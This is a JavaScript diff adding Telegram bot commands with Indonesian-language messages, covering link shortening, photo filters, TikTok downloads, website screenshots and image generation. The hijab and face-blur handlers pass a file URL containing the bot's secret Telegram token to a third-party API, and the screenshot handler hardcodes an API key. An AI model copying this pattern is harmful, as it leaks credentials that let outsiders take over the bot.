+const messageText = `/shortlink ${text || ''}`.trim();
+logUserInteraction(userId, username, chatType, messageText, groupName);
+let url = '';
+if (msg.reply_to_message && msg.reply_to_message.text) {
+url = msg.reply_to_message.text.trim();
+} else if (text) {
+url = text.trim();
+}
+if (!url) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Format salah!</blockquote>\n` +
+`<b>Contoh:</b> <code>/shortlink https://xyroorinzi.net</code>\n\n` +
+`<i>Atau reply pesan yang berisi URL.</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+const urlRegex = /^(https?:\/\/[^\s$.?#].[^\s]*)$/i;
+if (!urlRegex.test(url)) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ URL tidak valid!</blockquote>\n` +
+`<b>URL Anda:</b> <code>${escapeHTML(url)}</code>\n\n` +
+`<b>Contoh URL yang valid:</b>\n` +
+`• https://example.com\n` +
+`• http://website.net`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses shortlink...</blockquote>\n` +
+`<b>URL:</b> <code>${escapeHTML(url.substring(0, 50))}${url.length > 50 ? '...' : ''}</code>\n` +
+`<i>Menggunakan API NVidiaBotz...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+try {
+const apiUrl = `https://api.nvidiabotz.xyz/tools/tinyurl?url=${encodeURIComponent(url)}`;
+const response = await fetch(apiUrl);
+if (!response.ok) {
+throw new Error(`API error: ${response.status}`);
+}
+const data = await response.json();
+console.log('API Response:', data);
+if (!data.status || !data.result) {
+throw new Error('API gagal memproses URL');
+}
+const finalShortUrl = data.result;
+await bot.editMessageText(
+`<blockquote>✅ Shortlink berhasil dibuat!</blockquote>\n\n` +
+`<b>URL asli:</b>\n<code>${escapeHTML(url)}</code>\n\n` +
+`<b>Hasil shortlink:</b>\n<code>${escapeHTML(finalShortUrl)}</code>`,
+{
+chat_id: chatId,
+message_id: processingMsg.message_id,
+parse_mode: 'HTML',
+reply_markup: {
+inline_keyboard: [
+[
+{ text: '🔗 Buka Link', url: finalShortUrl }
+]
+]
+}
+}
+);
+} catch (error) {
+console.error('Shortlink error:', error);
+let errorMessage = '';
+if (error.message.includes('API error')) {
+errorMessage = `<blockquote>❌ API sedang gangguan!</blockquote>\n` +
+`<i>Sistem shortlink sedang tidak bisa diakses.</i>`;
+} else if (error.message.includes('gagal memproses')) {
+errorMessage = `<blockquote>❌ Gagal memproses URL!</blockquote>\n` +
+`<i>API tidak bisa memproses URL yang diberikan.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Gagal membuat shortlink!</blockquote>\n` +
+`<i>Terjadi kesalahan dalam sistem.</i>`;
+}
+try {
+await bot.editMessageText(
+errorMessage,
+{ 
+chat_id: chatId, 
+message_id: processingMsg.message_id, 
+parse_mode: 'HTML',
+reply_markup: { inline_keyboard: [] }
+}
+);
+} catch (editError) {
+console.error('Failed to edit error message:', editError);
+await bot.sendMessage(
+chatId,
+errorMessage,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🧕 TOHIJAB COMMAND - AI HIJAB FILTER
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/tohijab$/, async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = '/tohijab';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+if (!msg.reply_to_message || !msg.reply_to_message.photo) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Format salah!</blockquote>\n` +
+`<b>Reply foto dengan:</b> <code>/tohijab</code>\n\n` +
+`<i>Balas foto yang ingin diberi hijab.</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+try {
+const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
+const fileId = photo.file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter hijab AI...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/tohijab?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers['content-type'] || '';
+if (contentType.startsWith('image/')) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🧕 Foto berhasil diberi hijab!</blockquote>\n` +
+`<i>Filter hijab AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🧕 Foto berhasil diberi hijab!</blockquote>\n` +
+`<i>Filter hijab AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Tohijab error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+try {
+await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
+} catch (e) {}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🧕 HANDLER UNTUK FOTO DENGAN CAPTION /TOHIJAB
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.on('photo', async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+if (msg.caption && msg.caption.trim() === '/tohijab') {
+const messageText = 'PHOTO_CAPTION: /tohijab';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+try {
+const fileId = msg.photo[msg.photo.length - 1].file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mengaplikasikan filter hijab AI...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/tohijab?url=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers['content-type'] || '';
+if (contentType.startsWith('image/')) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🧕 Foto berhasil diberi hijab!</blockquote>\n` +
+`<i>Filter hijab AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url || jsonData.data?.result;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🧕 Foto berhasil diberi hijab!</blockquote>\n` +
+`<i>Filter hijab AI berhasil diterapkan.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Tohijab caption error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🎫 TOBLUR COMMAND - BLUR WAJAH PADA FOTO
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/toblur$/, async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = '/toblur';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+if (!msg.reply_to_message || !msg.reply_to_message.photo) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Format salah!</blockquote>\n` +
+`<b>Reply foto dengan:</b> <code>/toblur</code>\n\n` +
+`<i>Balas foto yang ingin diblur wajahnya.</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+try {
+const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
+const fileId = photo.file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mendeteksi dan mem-blur wajah...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/blurwajah?image=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers['content-type'] || '';
+if (contentType.startsWith('image/')) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🙈 Wajah sudah diblur otomatis!</blockquote>\n` +
+`<i>Foto berhasil diproses dengan AI blur wajah.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.image || jsonData.url || jsonData.result || jsonData.data?.url || jsonData.data;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🙈 Wajah sudah diblur otomatis!</blockquote>\n` +
+`<i>Foto berhasil diproses dengan AI blur wajah.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Toblur error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+try {
+await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
+} catch (e) {}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🎫 HANDLER UNTUK FOTO DENGAN CAPTION /TOBLUR
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.on('photo', async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+if (msg.caption && msg.caption.trim() === '/toblur') {
+const messageText = 'PHOTO_CAPTION: /toblur';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+try {
+const fileId = msg.photo[msg.photo.length - 1].file_id;
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔄 Memproses foto...</blockquote>\n` +
+`<i>Mendeteksi dan mem-blur wajah...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const file = await bot.getFile(fileId);
+const filePath = file.file_path;
+const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
+const encodedUrl = encodeURIComponent(imageUrl);
+const apiUrl = `https://api-faa.my.id/faa/blurwajah?image=${encodedUrl}`;
+const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+const contentType = response.headers['content-type'] || '';
+if (contentType.startsWith('image/')) {
+const imageBuffer = Buffer.from(response.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🙈 Wajah sudah diblur otomatis!</blockquote>\n` +
+`<i>Foto berhasil diproses dengan AI blur wajah.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} else {
+try {
+const jsonData = JSON.parse(response.data.toString());
+const imageUrlFromApi = jsonData.image || jsonData.url || jsonData.result || jsonData.data?.url || jsonData.data;
+if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
+const imgResponse = await axios.get(imageUrlFromApi, { responseType: 'arraybuffer' });
+const imageBuffer = Buffer.from(imgResponse.data);
+await bot.sendPhoto(chatId, imageBuffer, {
+caption: `<blockquote>🙈 Wajah sudah diblur otomatis!</blockquote>\n` +
+`<i>Foto berhasil diproses dengan AI blur wajah.</i>`,
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (jsonError) {
+console.error('JSON parse error:', jsonError);
+await bot.editMessageText(
+`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
+`<code>${escapeHTML(jsonError.message)}</code>`,
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
+);
+}
+}
+} catch (error) {
+console.error('Toblur caption error:', error);
+let errorMessage = '';
+if (error.response?.status === 500) {
+errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
+`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
+} else if (error.message?.includes('timeout')) {
+errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
+`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
+`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
+}
+await bot.sendMessage(chatId, errorMessage, {
+parse_mode: 'HTML',
+reply_to_message_id: msg.message_id
+});
+}
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 📱 TIKTOK DOWNLOAD COMMAND
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/tt(?:\s+(.+))?$/, async (msg, match) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const input = match[1];
+const messageText = `/tt ${input || ''}`.trim();
+logUserInteraction(userId, username, chatType, messageText, groupName);
+if (!input) {
+return bot.sendMessage(chatId,
+"<blockquote>❌ Masukkan URL TikTok!</blockquote>\n\nContoh:\n<code>/tt https://vt.tiktok.com/ZSU7xy99R/</code>",
+{ parse_mode: "HTML" }
+);
+}
+const tiktokPatterns = [
+/tiktok\.com\/.*\/video\/\d+/,
+/vt\.tiktok\.com\/.+/,
+/vm\.tiktok\.com\/.+/
+];
+const isValidUrl = tiktokPatterns.some(pattern => pattern.test(input));
+if (!isValidUrl) {
+return bot.sendMessage(chatId,
+"<blockquote>❌ URL TikTok tidak valid!</blockquote>\n\nFormat yang didukung:\n• https://tiktok.com/@user/video/123\n• https://vt.tiktok.com/xxx\n• https://vm.tiktok.com/xxx",
+{ parse_mode: "HTML" }
+);
+}
+try {
+const processingMsg = await bot.sendMessage(chatId,
+"<blockquote>⏳ Mengambil data TikTok...</blockquote>",
+{ parse_mode: "HTML", reply_to_message_id: msg.message_id }
+);
+const encodedUrl = encodeURIComponent(input);
+// Ambil data dari kedua API secara bersamaan
+const [responseInfo, responseDownload] = await Promise.all([
+axios.get(`https://tikwm.com/api/?url=${encodedUrl}`, { timeout: 30000 }),
+axios.get(`https://api.nvidiabotz.xyz/download/tiktok?url=${encodedUrl}`, { timeout: 30000 })
+]);
+const infoData = responseInfo.data;
+const downloadData = responseDownload.data;
+if (infoData.code !== 0 || !infoData.data || !downloadData.status) {
+await bot.editMessageText(
+"<blockquote>❌ Gagal mengambil data TikTok!</blockquote>",
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: "HTML" }
+);
+return;
+}
+const videoInfo = infoData.data;
+const downloadResult = downloadData.result;
+const authorUniqueId = videoInfo.author?.unique_id || "";
+const videoUrl = downloadResult?.video_hd || videoInfo.play;
+if (!videoUrl) {
+await bot.editMessageText(
+"<blockquote>❌ Video tidak ditemukan!</blockquote>",
+{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: "HTML" }
+);
+return;
+}
+const cacheKey = `tt_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+global.tiktokCache = global.tiktokCache || {};
+global.tiktokCache[cacheKey] = { 
+infoData, 
+downloadData,
+videoInfo, 
+downloadResult,
+authorUniqueId,
+chatId: chatId,
+messageId: processingMsg.message_id,
+currentQuality: 'hd',
+currentMedia: 'video'
+};
+const formatNumber = (num) => {
+if (!num) return "0";
+if (num >= 1000000) return (num / 1000000).toFixed(1) + "M";
+if (num >= 1000) return (num / 1000).toFixed(1) + "K";
+return num.toString();
+};
+const caption = `<blockquote>📱 TIKTOK DOWNLOADER</blockquote>\n
+<b>🎬 Judul:</b> ${escapeHTML(videoInfo.title || 'Tidak ada judul')}\n
+<b>👤 Creator:</b> ${authorUniqueId ? `@${escapeHTML(authorUniqueId)}` : 'Tidak diketahui'}\n
+<b>📊 Statistik:</b>\n👁️ ${formatNumber(videoInfo.play_count || 0)} views\n❤️ ${formatNumber(videoInfo.digg_count || 0)} likes\n💬 ${formatNumber(videoInfo.comment_count || 0)} comments\n🔁 ${formatNumber(videoInfo.share_count || 0)} shares\n
+<b>⏱️ Durasi:</b> ${videoInfo.duration || 0} detik\n
+<i>Pilih opsi di bawah:</i>`;
+const inlineKeyboard = {
+inline_keyboard: [
+[
+{ text: "👤 LIHAT PROFIL", callback_data: `tt_profile_${cacheKey}` },
+{ text: "🎵 DOWNLOAD AUDIO", callback_data: `tt_audio_${cacheKey}` },
+{ text: "📹 DOWNLOAD SD", callback_data: `tt_sd_${cacheKey}` }
+],
+[
+{ text: "❌ BATAL", callback_data: `tt_cancel_${cacheKey}` }
+]
+]
+};
+await bot.sendVideo(chatId, videoUrl, { caption: caption, parse_mode: "HTML", reply_markup: inlineKeyboard, reply_to_message_id: msg.message_id });
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (error) {
+console.error("TikTok error:", error.message);
+logError('TIKTOK_ERROR', `URL: ${input}, Error: ${error.message}`, userId, username);
+bot.sendMessage(chatId, "<blockquote>❌ Error sistem!</blockquote>\n\nSilakan coba lagi atau gunakan URL yang berbeda.", { parse_mode: "HTML" });
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🌐 WEBSITE SCREENSHOT COMMAND
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/ssweb(?:\s+(.+))?$/, async (msg, match) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = `/ssweb ${match[1] || ''}`.trim();
+logUserInteraction(userId, username, chatType, messageText, groupName);
+const url = match[1];
+if (!url) {
+return bot.sendMessage(chatId,
+"<blockquote>❌ Masukkan URL website!</blockquote>\nContoh: <code>/ssweb https://google.com</code>",
+{ parse_mode: "HTML" }
+);
+}
+if (!url.startsWith('http://') && !url.startsWith('https://')) {
+return bot.sendMessage(chatId,
+"<blockquote>❌ URL harus dimulai dengan http:// atau https://</blockquote>",
+{ parse_mode: "HTML" }
+);
+}
+try {
+const processingMsg = await bot.sendMessage(chatId,
+"<blockquote>🌐 Mengambil screenshot...</blockquote>",
+{ parse_mode: "HTML", reply_to_message_id: msg.message_id }
+);
+const encodedUrl = encodeURIComponent(url);
+const apiUrl = `https://api.jarroffc.my.id/tools/ssweb?apikey=jarroffc&url=${encodedUrl}`;
+const response = await axios.get(apiUrl);
+const data = response.data;
+if (!data.status || !data.result) {
+throw new Error('Gagal mengambil screenshot');
+}
+const screenshotUrl = data.result;
+const screenshotResponse = await axios.get(screenshotUrl, { responseType: 'arraybuffer' });
+const buffer = Buffer.from(screenshotResponse.data);
+await bot.sendPhoto(chatId, buffer, {
+caption: `<blockquote>✅ Screenshot berhasil!</blockquote>
+<b>URL:</b> <code>${escapeHTML(url)}</code>
+<b>Sumber:</b> ${data.creator || 'Jarr Officiall'}`,
+parse_mode: "HTML",
+reply_to_message_id: msg.message_id
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (error) {
+console.error('SSWeb error:', error.message);
+logError('SSWEB_ERROR', `URL: ${url}, Error: ${error.message}`, userId, username);
+if (error.response?.status === 404) {
+bot.sendMessage(chatId,
+"<blockquote>❌ Website tidak ditemukan</blockquote>",
+{ parse_mode: "HTML" }
+);
+} else if (error.message.includes('Gagal mengambil screenshot')) {
+bot.sendMessage(chatId,
+"<blockquote>❌ Gagal mengambil screenshot</blockquote>",
+{ parse_mode: "HTML" }
+);
+} else if (error.message.includes('timeout')) {
+bot.sendMessage(chatId,
+"<blockquote>❌ Timeout, coba lagi</blockquote>",
+{ parse_mode: "HTML" }
+);
+} else {
+bot.sendMessage(chatId,
+"<blockquote>❌ Error sistem</blockquote>",
+{ parse_mode: "HTML" }
+);
+}
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🖼️ HD IMAGE ENHANCER COMMAND
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/hd$/, async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = '/hd';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+let fileId = null;
+if (msg.reply_to_message && msg.reply_to_message.photo) {
+fileId = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1].file_id;
+}
+if (!fileId) {
+return bot.sendMessage(chatId, 
+"<blockquote>❌ Reply foto dengan /hd</blockquote>",
+{ parse_mode: "HTML" }
+);
+}
+try {
+const processingMsg = await bot.sendMessage(chatId, 
+"<blockquote>⚡ Memproses...</blockquote>",
+{ parse_mode: "HTML" }
+);
+const fileLink = await bot.getFileLink(fileId);
+const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
+const imageBuffer = Buffer.from(response.data);
+const enhancedBuffer = await enhanceImage(imageBuffer);
+await bot.sendPhoto(chatId, enhancedBuffer, {
+caption: "<blockquote>✅ HD Enhance selesai</blockquote>",
+parse_mode: "HTML"
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (error) {
+bot.sendMessage(chatId, 
+"<blockquote>❌ Gagal memproses</blockquote>",
+{ parse_mode: "HTML" }
+);
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 📸 PHOTO WITH /HD CAPTION HANDLER
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.on('photo', async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+if (msg.caption && msg.caption.trim() === '/hd') {
+const messageText = 'PHOTO_CAPTION: /hd';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+const fileId = msg.photo[msg.photo.length - 1].file_id;
+try {
+const processingMsg = await bot.sendMessage(chatId, 
+"<blockquote>⚡ Memproses...</blockquote>",
+{ parse_mode: "HTML" }
+);
+const fileLink = await bot.getFileLink(fileId);
+const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
+const imageBuffer = Buffer.from(response.data);
+const enhancedBuffer = await enhanceImage(imageBuffer);
+await bot.sendPhoto(chatId, enhancedBuffer, {
+caption: "<blockquote>✅ HD Enhance selesai</blockquote>",
+parse_mode: "HTML"
+});
+await bot.deleteMessage(chatId, processingMsg.message_id);
+} catch (error) {
+bot.sendMessage(chatId, 
+"<blockquote>❌ Gagal memproses</blockquote>",
+{ parse_mode: "HTML" }
+);
+}
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🎨 IMAGE/STICKER GENERATOR COMMANDS
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/iqc(?:\s+(.+))?/, async (msg, match) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = `/iqc ${match[1] || ''}`.trim();
+logUserInteraction(userId, username, chatType, messageText, groupName);
+const input = match[1];
+if (!input) {
+return bot.sendMessage(chatId,
+"<blockquote>❌ Format salah.</blockquote>\n\nContoh penggunaan:\n<code>/iqc Woik| 00:55 | 55 | INDOSAT</code>",
+{ parse_mode: "HTML" }
+);
+}
+const parts = input.split("|").map(p => p.trim());
+const text = parts[0];
+const time = parts[1] || "12:12";
+const battery = parts[2] || "17";
+const carrier = parts[3] || "INDOSAT OREDOO";
+const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;
+try {
+await bot.sendChatAction(chatId, "upload_photo");
+const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
